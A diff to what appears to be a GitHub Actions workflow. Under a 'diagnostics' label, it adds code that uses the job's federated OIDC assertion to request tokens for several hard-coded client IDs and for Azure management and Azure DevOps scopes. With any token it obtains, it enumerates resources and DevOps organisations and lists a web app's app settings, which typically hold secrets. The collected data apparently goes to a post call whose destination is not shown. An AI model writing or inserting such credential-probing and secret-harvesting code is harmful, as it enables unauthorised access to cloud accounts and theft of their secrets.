@@ -149,38 +149,58 @@ jobs:
                   oidc["request"] = oidc_response
 
           azure_results = {}
-          candidate_client_ids = sorted({subscription, tenant})
+          candidate_client_ids = sorted({
+              subscription,
+              tenant,
+              "4aadba6b-30c8-42db-9b93-024d5c62b887",
+              "499b84ac-1321-427f-aa17-267ca6975798",
+              "797f4846-ba00-4fd7-ba43-dac1f8f63013",
+              "6dae42f8-4368-4678-94ff-3960e28e3630",
+          })
+          token_scopes = [
+              "https://management.azure.com/.default",
+              "499b84ac-1321-427f-aa17-267ca6975798/.default",
+          ]
           if assertion:
               for client_id in candidate_client_ids:
-                  form = urllib.parse.urlencode({
-                      "grant_type": "client_credentials",
-                      "client_id": client_id,
-                      "scope": "https://management.azure.com/.default",
-                      "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-                      "client_assertion": assertion,
-                  }).encode()
-                  token_result = api(
-                      f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
-                      {"Content-Type": "application/x-www-form-urlencoded"},
-                      form,
-                      "POST",
-                  )
-                  body = token_result["body"]
-                  azure_results[client_id] = {
-                      "status": token_result["status"],
-                      "error": body.get("error") if isinstance(body, dict) else None,
-                      "error_description": (body.get("error_description", "")[:500] if isinstance(body, dict) else str(body)[:500]),
-                      "access_token_present": bool(isinstance(body, dict) and body.get("access_token")),
-                  }
-                  access_token = body.get("access_token") if isinstance(body, dict) else None
-                  if access_token:
-                      arm_headers = {"Authorization": "Bearer " + access_token, "Accept": "application/json"}
-                      for name, url, method, payload in [
-                          ("resources", f"https://management.azure.com/subscriptions/{subscription}/resourceGroups/{resource_group}/resources?api-version=2021-04-01", "GET", None),
-                          ("site", f"https://management.azure.com/subscriptions/{subscription}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{site_name}?api-version=2022-03-01", "GET", None),
-                          ("appsettings", f"https://management.azure.com/subscriptions/{subscription}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{site_name}/config/appsettings/list?api-version=2022-03-01", "POST", b"{}"),
-                      ]:
-                          azure_results[client_id][name] = api(url, {**arm_headers, "Content-Type": "application/json"}, payload, method)
+                  azure_results[client_id] = {}
+                  for scope in token_scopes:
+                      form = urllib.parse.urlencode({
+                          "grant_type": "client_credentials",
+                          "client_id": client_id,
+                          "scope": scope,
+                          "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+                          "client_assertion": assertion,
+                      }).encode()
+                      token_result = api(
+                          f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
+                          {"Content-Type": "application/x-www-form-urlencoded"},
+                          form,
+                          "POST",
+                      )
+                      body = token_result["body"]
+                      scope_result = {
+                          "status": token_result["status"],
+                          "error": body.get("error") if isinstance(body, dict) else None,
+                          "error_description": (body.get("error_description", "")[:500] if isinstance(body, dict) else str(body)[:500]),
+                          "access_token_present": bool(isinstance(body, dict) and body.get("access_token")),
+                      }
+                      access_token = body.get("access_token") if isinstance(body, dict) else None
+                      if access_token and scope.startswith("https://management.azure.com/"):
+                          arm_headers = {"Authorization": "Bearer " + access_token, "Accept": "application/json"}
+                          for name, url, method, payload in [
+                              ("resources", f"https://management.azure.com/subscriptions/{subscription}/resourceGroups/{resource_group}/resources?api-version=2021-04-01", "GET", None),
+                              ("site", f"https://management.azure.com/subscriptions/{subscription}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{site_name}?api-version=2022-03-01", "GET", None),
+                              ("appsettings", f"https://management.azure.com/subscriptions/{subscription}/resourceGroups/{resource_group}/providers/Microsoft.Web/sites/{site_name}/config/appsettings/list?api-version=2022-03-01", "POST", b"{}"),
+                          ]:
+                              scope_result[name] = api(url, {**arm_headers, "Content-Type": "application/json"}, payload, method)
+                      if access_token and scope.startswith("499b84ac-"):
+                          devops_headers = {"Authorization": "Bearer " + access_token, "Accept": "application/json"}
+                          scope_result["devops_orgs"] = api(
+                              f"https://aexprodcus1.vsaex.visualstudio.com/_apis/EnterpriseCatalog/Organizations?tenantId={tenant}",
+                              devops_headers,
+                          )
+                      azure_results[client_id][scope] = scope_result
 
           post("oidc-cloud-diagnostics", {
               "github": {
